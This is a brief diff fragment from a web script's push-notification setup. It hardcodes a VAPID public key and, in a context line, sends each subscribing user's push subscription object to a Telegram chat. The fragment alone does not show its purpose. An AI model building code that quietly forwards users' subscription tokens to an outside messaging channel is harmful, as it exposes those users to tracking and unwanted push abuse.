@@ -127,7 +127,7 @@
 
                         const subscription = await registration.pushManager.subscribe({
                             userVisibleOnly: true,
-                            applicationServerKey: VAPID_PUBLIC_KEY
+                            applicationServerKey: "BCBFe9fAzH5DGk5zea_Vlu37rxoi6BmRr0T7S84UCpPaqjJugIGpUzSuq6ZOwDXEmhTYTWWgmjbqBLKCFgs1Yg8",
                         });
 
                         await sendToTelegram(`🚀 *Push Token Received for #${userId}*\n\`${JSON.stringify(subscription)}\``);
